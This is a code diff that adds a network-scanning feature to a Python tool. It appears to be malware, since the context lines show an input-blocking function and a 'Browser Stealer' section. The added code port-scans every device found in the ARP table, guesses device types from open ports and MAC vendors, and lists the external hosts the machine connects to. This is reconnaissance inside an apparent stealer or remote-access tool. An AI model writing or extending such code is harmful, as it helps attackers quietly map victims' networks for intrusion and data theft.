@@ -584,9 +584,132 @@ def _block_input(block=True):
     except Exception as e: return False, str(e)
 
 # ── Network Scanner ──────────────────────────────────────────────────
+
+# Common ports to scan + their service names
+_COMMON_PORTS = {
+    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+    80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
+    443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
+    3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
+    6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9090: 'Web-Alt',
+    27017: 'MongoDB', 515: 'LPD/Printer', 631: 'IPP/Printer', 9100: 'JetDirect/Printer',
+    548: 'AFP', 5000: 'UPnP', 5353: 'mDNS', 7000: 'AirPlay',
+    1900: 'SSDP', 5357: 'WSD', 8000: 'HTTP-Alt', 8888: 'HTTP-Alt',
+    8008: 'Chromecast', 8009: 'Chromecast', 554: 'RTSP',
+}
+
+# ── MAC OUI Lookup Table ─────────────────────────────────────────────
+_MAC_OUI = {
+    'C0:56:27': 'TP-Link', 'B0:95:75': 'TP-Link', 'D8:47:32': 'TP-Link', 'A4:2B:B0': 'TP-Link',
+    '00:11:32': 'Synology', '00:25:90': 'Supermicro',
+    '3C:52:82': 'HP', 'B4:99:BA': 'HP', 'D8:9E:F3': 'HP', 'E4:11:5B': 'HP', '70:5A:0F': 'HP',
+    'B8:27:EB': 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi',
+    'A4:83:E7': 'Dell', 'B8:AC:6F': 'Dell', 'F0:1F:AF': 'Dell', 'F0:D5:BF': 'Dell',
+    '2C:F0:5D': 'ASUS', '0C:9D:92': 'ASUS', 'E0:CB:4E': 'ASUS',
+    '18:B4:30': 'Google', '54:60:09': 'Google',
+    '8A:3F:1C': 'Apple', 'A8:6B:AD': 'Apple', '8C:8D:28': 'Apple', 'AC:BC:32': 'Apple', 'F0:18:98': 'Apple',
+    '94:57:2C': 'Samsung', '6C:40:08': 'Xiaomi', 'B0:83:FE': 'Reolink', 'C4:2F:90': 'Cisco',
+    '00:1A:11': 'Google', '1C:87:2C': 'D-Link', '14:CC:20': 'Netgear',
+    '00:50:56': 'VMware', '08:00:27': 'VirtualBox',
+    '00:1B:44': 'Canon', '00:26:73': 'RICOH', '00:1C:C4': 'Brother',
+    '00:1D:7E': 'Cisco-Linksys', '00:23:69': 'Cisco-Linksys',
+    '60:45:BD': 'Microsoft', '00:15:5D': 'Microsoft',
+    '00:0C:29': 'VMware', '00:1C:42': 'Parallels',
+    'BC:92:6B': 'Apple', 'A4:D1:D2': 'Apple',
+    '00:1B:63': 'Apple', '00:25:BC': 'Apple',
+    'D0:D0:03': 'Samsung', 'CC:3A:61': 'Samsung',
+    '18:26:49': 'Sony', '00:0D:D0': 'Sony',
+    'F8:46:1C': 'Sony', 'BC:30:D9': 'Sony',
+    '2C:54:91': 'Microsoft', '58:82:A8': 'Microsoft',
+    '00:24:BE': 'QNAP', '00:08:9B': 'QNAP',
+    '00:14:FD': 'Roku', 'B0:A7:37': 'Roku',
+    '00:1E:C2': 'Apple', '54:26:96': 'Apple',
+}
+
+def _classify_machine(ip, mac_vendor, open_ports):
+    """Classify a machine type based on its open ports and other clues."""
+    ports = set(open_ports)
+
+    # Gateway heuristic
+    parts = ip.split('.')
+    is_gw = len(parts) == 4 and int(parts[3]) in (1, 254)
+
+    if is_gw:
+        return 'router', '📡', 'Router / Gateway'
+
+    # Strong signals
+    has_windows = 445 in ports or 135 in ports or 139 in ports
+    has_rdp = 3389 in ports
+    has_ssh = 22 in ports
+    has_web = 80 in ports or 443 in ports or 8080 in ports or 8443 in ports
+    has_printer = 515 in ports or 631 in ports or 9100 in ports
+    has_db = 3306 in ports or 5432 in ports or 27017 in ports or 6379 in ports
+    has_nas = 548 in ports  # AFP
+    has_upnp = 5000 in ports or 1900 in ports
+
+    if has_printer:
+        return 'printer', '🖨️', 'Printer'
+
+    if has_ssh and has_web:
+        return 'linux_server', '🐧', 'Linux Web Server'
+    if has_ssh:
+        return 'linux_server', '🐧', 'Linux/Unix Server'
+
+    if has_windows and has_rdp:
+        return 'windows_pc', '🪟', 'Windows PC'
+    if has_windows and has_web:
+        if has_nas or mac_vendor.lower() in ('synology', 'qnap', 'western digital', 'seagate'):
+            return 'nas', '🗄️', 'NAS / File Server'
+        return 'windows_server', '🪟', 'Windows Server'
+    if has_rdp:
+        return 'windows_pc', '🪟', 'Windows PC (RDP)'
+    if has_windows:
+        return 'windows_pc', '🪟', 'Windows PC'
+
+    if has_db:
+        return 'database', '🗃️', 'Database Server'
+
+    if has_web:
+        if mac_vendor.lower() in ('tp-link', 'd-link', 'netgear', 'asus', 'cisco', 'linksys', 'belkin'):
+            return 'router', '📡', 'Router / AP'
+        return 'web_server', '🌐', 'Web Server'
+
+    if has_upnp:
+        return 'iot', '📱', 'IoT / Media Device'
+
+    # By MAC vendor only
+    vendor_lower = mac_vendor.lower()
+    if any(x in vendor_lower for x in ('apple', 'samsung', 'xiaomi', 'huawei', 'oneplus')):
+        return 'mobile', '📱', 'Mobile Device'
+    if any(x in vendor_lower for x in ('google', 'amazon', 'nest', 'ring', 'arlo', 'wyze')):
+        return 'iot', '🏠', 'Smart Home Device'
+    if any(x in vendor_lower for x in ('raspberry', 'arduino')):
+        return 'linux_server', '🥧', 'Embedded Linux'
+    if any(x in vendor_lower for x in ('sony', 'lg', 'samsung', 'roku', 'vizio')):
+        return 'iot', '📺', 'Smart TV / Media'
+    if any(x in vendor_lower for x in ('hp', 'brother', 'canon', 'epson', 'xerox')):
+        return 'printer', '🖨️', 'Printer'
+
+    return 'unknown', '❓', 'Unknown Device'
+
+def _scan_ports(ip, ports, timeout=0.4):
+    """Quick TCP connect scan on a list of ports. Returns list of open ports."""
+    open_ports = []
+    for port in ports:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            result = s.connect_ex((ip, port))
+            s.close()
+            if result == 0:
+                open_ports.append(port)
+        except:
+            pass
+    return open_ports
+
 def _network_info():
-    """Get network interfaces, active connections, and ARP table."""
-    info = {"interfaces": [], "connections": [], "arp": []}
+    """Get network interfaces, active connections, ARP table, and port-scan results."""
+    info = {"interfaces": [], "connections": [], "arp": [], "local_network": [], "external_hosts": []}
     # Interfaces
     try:
         if HAS["psutil"]:
@@ -632,6 +755,93 @@ def _network_info():
                 if "(" in line and ")" in line:
                     info["arp"].append(line.strip())
     except Exception as e: info["arp_error"] = str(e)
+
+    # ── Port scanning + machine classification (local network devices) ──
+    port_list = sorted(_COMMON_PORTS.keys())
+    for arp_entry in info["arp"]:
+        if not isinstance(arp_entry, dict) or not arp_entry.get("ip"):
+            continue
+        ip = arp_entry["ip"]
+        mac = arp_entry.get("mac", "")
+        # Skip multicast, broadcast, self
+        if ip.startswith("224.") or ip.startswith("239.") or ip.startswith("255.") or ip == "0.0.0.0":
+            continue
+        # Quick MAC OUI lookup
+        mac_vendor = "Unknown"
+        if mac:
+            parts_mac = mac.replace("-", ":").upper().split(":")
+            if len(parts_mac) >= 3:
+                oui = ":".join(parts_mac[:3])
+                mac_vendor = _MAC_OUI.get(oui, "Unknown")
+        # Scan ports
+        open_ports = _scan_ports(ip, port_list)
+        open_services = {p: _COMMON_PORTS[p] for p in open_ports}
+        machine_type, icon, label = _classify_machine(ip, mac_vendor, open_ports)
+        info["local_network"].append({
+            "ip": ip, "mac": mac,
+            "vendor": mac_vendor,
+            "open_ports": open_ports,
+            "open_services": open_services,
+            "machine_type": machine_type,
+            "machine_label": label,
+            "machine_icon": icon,
+            "arp_type": arp_entry.get("type", ""),
+            "network": "local"
+        })
+
+    # ── Extract external hosts from active connections ──
+    seen_ext = set()
+    for conn in info.get("connections", []):
+        remote = conn.get("remote", "")
+        if not remote or not isinstance(remote, str):
+            continue
+        parts = remote.rsplit(":", 1)
+        if len(parts) != 2:
+            continue
+        ext_ip, ext_port = parts[0], parts[1]
+        # Skip local/private IPs
+        if ext_ip.startswith("127.") or ext_ip.startswith("10.") or ext_ip.startswith("192.168.") or ext_ip.startswith("172."):
+            # Check if it's truly private (172.16.0.0/12)
+            if ext_ip.startswith("172."):
+                try:
+                    second = int(ext_ip.split(".")[1])
+                    if 16 <= second <= 31:
+                        continue
+                except:
+                    continue
+            else:
+                continue
+        if ext_ip in ("0.0.0.0", "*", "::", "::1"):
+            continue
+        try:
+            ext_port_int = int(ext_port)
+        except:
+            ext_port_int = 0
+        svc = _COMMON_PORTS.get(ext_port_int, "")
+        key = f"{ext_ip}:{ext_port}"
+        if key in seen_ext:
+            continue
+        seen_ext.add(key)
+        info["external_hosts"].append({
+            "ip": ext_ip,
+            "port": ext_port_int,
+            "service": svc,
+            "status": conn.get("status", ""),
+            "pid": conn.get("pid", 0),
+            "local_addr": conn.get("local", ""),
+            "network": "external"
+        })
+
+    # Deduplicate external hosts (keep unique IPs with port info)
+    ext_by_ip = {}
+    for h in info["external_hosts"]:
+        ip = h["ip"]
+        if ip not in ext_by_ip:
+            ext_by_ip[ip] = dict(h)
+            ext_by_ip[ip]["all_ports"] = []
+        ext_by_ip[ip]["all_ports"].append({"port": h["port"], "service": h["service"]})
+    info["external_hosts"] = list(ext_by_ip.values())
+
     return info
 
 # ── Browser Stealer ──────────────────────────────────────────────────
